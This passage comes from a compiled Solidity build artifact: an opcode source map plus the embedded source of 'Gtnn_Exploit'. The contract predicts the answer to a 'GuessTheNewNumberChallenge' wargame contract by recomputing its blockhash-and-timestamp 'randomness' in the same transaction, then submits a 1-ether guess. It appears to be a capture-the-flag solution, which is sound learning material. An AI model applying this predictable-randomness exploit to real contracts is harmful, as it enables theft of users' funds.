        724
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "43": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        379,
        724
      ],
      "op": "CALLVALUE",
      "path": "0"
    },
    "44": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        379,
        724
      ],
      "op": "DUP1",
      "path": "0"
    },
    "45": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        379,
        724
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "46": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        379,
        724
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x35"
    },
    "48": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        379,
        724
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "49": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        379,
        724
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "51": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        379,
        724
      ],
      "op": "DUP1",
      "path": "0"
    },
    "52": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        379,
        724
      ],
      "op": "REVERT",
      "path": "0"
    },
    "53": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        379,
        724
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "54": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        379,
        724
      ],
      "op": "POP",
      "path": "0"
    },
    "55": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        379,
        724
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x3C"
    },
    "57": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        379,
        724
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x3E"
    },
    "59": {
      "fn": "Gtnn_Exploit.exploit",
      "jump": "i",
      "offset": [
        379,
        724
      ],
      "op": "JUMP",
      "path": "0"
    },
    "60": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        379,
        724
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "61": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        379,
        724
      ],
      "op": "STOP",
      "path": "0"
    },
    "62": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        379,
        724
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "63": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        502,
        634
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "65": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        502,
        634
      ],
      "op": "DUP1",
      "path": "0"
    },
    "66": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        502,
        634
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "67": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "69": {
      "op": "NOT"
    },
    "70": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        554,
        566
      ],
      "op": "NUMBER",
      "path": "0"
    },
    "71": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        554,
        570
      ],
      "op": "ADD",
      "path": "0"
    },
    "72": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        544,
        571
      ],
      "op": "BLOCKHASH",
      "path": "0"
    },
    "73": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        502,
        634
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "75": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        502,
        634
      ],
      "op": "DUP1",
      "path": "0"
    },
    "76": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        502,
        634
      ],
      "op": "DUP4",
      "path": "0"
    },
    "77": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        502,
        634
      ],
      "op": "ADD",
      "path": "0"
    },
    "78": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        502,
        634
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "79": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        502,
        634
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "80": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        502,
        634
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "81": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        502,
        634
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "82": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        597,
        612
      ],
      "op": "TIMESTAMP",
      "path": "0"
    },
    "83": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        502,
        634
      ],
      "op": "DUP3",
      "path": "0"
    },
    "84": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        502,
        634
      ],
      "op": "DUP5",
      "path": "0"
    },
    "85": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        502,
        634
      ],
      "op": "ADD",
      "path": "0"
    },
    "86": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        502,
        634
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "87": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        502,
        634
      ],
      "op": "DUP3",
      "path": "0"
    },
    "88": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        502,
        634
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "89": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        502,
        634
      ],
      "op": "DUP1",
      "path": "0"
    },
    "90": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        502,
        634
      ],
      "op": "DUP4",
      "path": "0"
    },
    "91": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        502,
        634
      ],
      "op": "SUB",
      "path": "0"
    },
    "92": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        502,
        634
      ],
      "op": "DUP5",
      "path": "0"
    },
    "93": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        502,
        634
      ],
      "op": "ADD",
      "path": "0"
    },
    "94": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        502,
        634
      ],
      "op": "DUP2",
      "path": "0"
    },
    "95": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        502,
        634
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "96": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        502,
        634
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x60"
    },
    "98": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        502,
        634
      ],
      "op": "DUP4",
      "path": "0"
    },
    "99": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        502,
        634
      ],
      "op": "ADD",
      "path": "0"
    },
    "100": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        502,
        634
      ],
      "op": "DUP1",
      "path": "0"
    },
    "101": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        502,
        634
      ],
      "op": "DUP6",
      "path": "0"
    },
    "102": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        502,
        634
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "103": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        471,
        652
      ],
      "op": "DUP2",
      "path": "0"
    },
    "104": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        471,
        652
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "105": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        471,
        652
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "106": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        471,
        652
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "107": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        471,
        652
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "108": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        471,
        652
      ],
      "op": "ADD",
      "path": "0"
    },
    "109": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        471,
        652
      ],
      "op": "KECCAK256",
      "path": "0"
    },
    "110": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        415,
        424
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "112": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        690
      ],
      "op": "DUP1",
      "path": "0",
      "statement": 0
    },
    "113": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        690
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "114": {
      "op": "PUSH4",
      "value": "0x4BA4C16B"
    },
    "119": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "121": {
      "op": "SHL"
    },
    "122": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "123": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "SWAP4",
      "path": "0"
    },
    "124": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "125": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0xFF"
    },
    "127": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "DUP3",
      "path": "0"
    },
    "128": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "AND",
      "path": "0"
    },
    "129": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x64"
    },
    "131": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "DUP6",
      "path": "0"
    },
    "132": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "ADD",
      "path": "0"
    },
    "133": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "134": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "SWAP4",
      "path": "0"
    },
    "135": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "136": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        471,
        652
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "137": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        471,
        652
      ],
      "op": "SWAP4",
      "path": "0"
    },
    "138": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "140": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "142": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "144": {
      "op": "SHL"
    },
    "145": {
      "op": "SUB"
    },
    "146": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        690
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "147": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        690
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "148": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        690
      ],
      "op": "AND",
      "path": "0"
    },
    "149": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        690
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "150": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        696
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x4BA4C16B"
    },
    "155": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        696
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "156": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        704,
        711
      ],
      "op": "PUSH8",
      "path": "0",
      "value": "0xDE0B6B3A7640000"
    },
    "165": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        704,
        711
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "166": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x84"
    },
    "168": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "DUP1",
      "path": "0"
    },
    "169": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "DUP5",
      "path": "0"
    },
    "170": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "ADD",
      "path": "0"
    },
    "171": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "SWAP4",
      "path": "0"
    },
    "172": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "DUP3",
      "path": "0"
    },
    "173": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "174": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "SUB",
      "path": "0"
    },
    "175": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "ADD",
      "path": "0"
    },
    "176": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "DUP2",
      "path": "0"
    },
    "177": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        704,
        711
      ],
      "op": "DUP6",
      "path": "0"
    },
    "178": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        690
      ],
      "op": "DUP9",
      "path": "0"
    },
    "179": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "DUP1",
      "path": "0"
    },
    "180": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "EXTCODESIZE",
      "path": "0"
    },
    "181": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "182": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "DUP1",
      "path": "0"
    },
    "183": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "184": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0xBF"
    },
    "186": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "187": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "189": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "DUP1",
      "path": "0"
    },
    "190": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "REVERT",
      "path": "0"
    },
    "191": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "192": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "POP",
      "path": "0"
    },
    "193": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "GAS",
      "path": "0"
    },
    "194": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "CALL",
      "path": "0"
    },
    "195": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "196": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "DUP1",
      "path": "0"
    },
    "197": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "198": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0xD2"
    },
    "200": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "201": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "202": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "204": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "DUP1",
      "path": "0"
    },
    "205": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "206": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "207": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "209": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "REVERT",
      "path": "0"
    },
    "210": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "211": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "POP",
      "path": "0"
    },
    "212": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "POP",
      "path": "0"
    },
    "213": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "POP",
      "path": "0"
    },
    "214": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "POP",
      "path": "0"
    },
    "215": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        686,
        717
      ],
      "op": "POP",
      "path": "0"
    },
    "216": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        379,
        724
      ],
      "op": "POP",
      "path": "0"
    },
    "217": {
      "fn": "Gtnn_Exploit.exploit",
      "jump": "o",
      "offset": [
        379,
        724
      ],
      "op": "JUMP",
      "path": "0"
    }
  },
  "sha1": "50678c70b19ad25b81c838ca4da6f4ab3190e752",
  "source": "pragma solidity ^0.7.3;\n\ninterface GuessTheNewNumberChallenge {\n    function isComplete() external view returns (bool);\n\n    function guess(uint8 n) external payable;\n}\n\ncontract Gtnn_Exploit {\n    GuessTheNewNumberChallenge gtnn;\n\n    constructor(address _address) payable {\n        require(msg.value == 1 ether);\n        gtnn = GuessTheNewNumberChallenge(_address);\n    }\n\n    function exploit() public {\n        uint8 ans = uint8(\n            uint256(\n                keccak256(\n                    abi.encodePacked(\n                        blockhash(block.number - 1),\n                        block.timestamp\n                    )\n                )\n            )\n        );\n        gtnn.guess{value: 1 ether}(ans);\n    }\n\n    receive() external payable {}\n}\n",
  "sourceMap": "170:591:0:-:0;;;236:137;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;236:137:0;305:7;292:9;:20;284:29;;;;;;323:4;:43;;-1:-1:-1;;;;;323:43:0;;;-1:-1:-1;;;;;;323:43:0;;;;;;;;;170:591;;;;;;",
  "sourcePath": "contracts/Gtnn_Exploit.sol",
  "type": "contract"
}